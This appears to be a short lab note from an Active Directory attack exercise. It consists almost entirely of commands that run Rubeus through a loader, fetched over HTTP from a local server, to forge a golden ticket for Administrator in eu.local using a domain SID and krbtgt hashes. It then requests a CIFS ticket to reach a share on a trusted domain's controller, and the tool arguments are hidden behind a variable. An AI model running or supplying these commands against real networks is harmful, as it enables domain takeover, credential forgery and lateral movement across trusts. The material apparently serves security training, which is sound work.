
Task 

• Using the DA access to eu.local: 
− Access eu-share on euvendor-dc. 
− Access euvendor-net using PowerShell Remoting



```
echo %Pwn% golden
```


```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /aes256:b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d /ptt
```


```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /user:Administrator /ldap /service:krbtgt/eu.local /rc4:b96659c7b2109d2e63e6de676d48646c /sid:S-1-5-21-3657428294-2017276338-1274645009 /nowrap
```

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt /ticket:
```

